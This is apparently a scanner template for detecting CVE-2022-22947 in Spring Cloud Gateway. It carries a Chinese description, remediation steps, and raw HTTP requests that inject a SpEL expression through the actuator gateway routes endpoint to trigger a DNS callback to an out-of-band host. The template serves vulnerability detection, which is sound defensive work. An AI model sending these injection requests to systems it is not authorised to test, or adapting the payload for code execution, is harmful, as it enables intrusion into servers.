id: CVE-2022-22947
info:
  name: Spring Cloud Gateway Code Injection
  author:
  - l0ne1y
  description: |-
    SpringCloud Gateway 远程代码执行漏洞
    Spring Cloud Gateway 是基于 Spring Framework 和 Spring Boot 构建的 API 网关，它旨在为微服务架构提供一种简单、有效、统一的 API 路由管理方式。

    Spring官方博客发布了一篇关于Spring Cloud Gateway的CVE报告，据公告描述，当启用和暴露 Gateway Actuator 端点时，使用 Spring Cloud Gateway 的应用程序可受到代码注入攻击。攻击者可以发送特制的恶意请求，从而远程执行任意代码。
  severity: critical
  remediation: |-
    #### 官方修复方案：
    官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本

    #### 临时修复方案：
    1. 如果不需要`Gateway actuator endpoint`，可通过 `management.endpoint.gateway.enabled: false` 禁用它。
    2. 如果需要actuator，则应使用 `Spring Security` 对其进行防护，可参考：[https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints.security](https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints.security)
requests:
- matchers:
  - type: status
    status:
    - 201
  - type: word
    part: header
    words:
    - /routes/{{randstr}}
  - type: word
    part: interactsh_protocol
    words:
    - dns
  matchers-condition: and
  raw:
  - |
    POST /actuator/gateway/routes/{{randstr}} HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/json

    {
      "predicates": [
        {
          "name": "Path",
          "args": {
            "_genkey_0": "/{{randstr}}/**"
          }
        }
      ],
      "filters": [
        {
          "name": "RewritePath",
          "args": {
            "_genkey_0": "#{T(java.net.InetAddress).getByName(\"{{interactsh-url}}\")}",
            "_genkey_1": "/${path}"
          }
        }
      ],
      "uri": "{{RootURL}}",
      "order": 0
    }
  - |
    POST /actuator/gateway/refresh HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/json

    {
      "predicate": "Paths: [/{{randstr}}], match trailing slash: true",
      "route_id": "{{randstr}}",
      "filters": [
        "[[RewritePath #{T(java.net.InetAddress).getByName(\"{{interactsh-url}}\")} = /${path}], order = 1]"
      ],
      "uri": "{{RootURL}}",
      "order": 0
    }
  - |
    DELETE /actuator/gateway/routes/{{randstr}} HTTP/1.1
    Host: {{Hostname}}
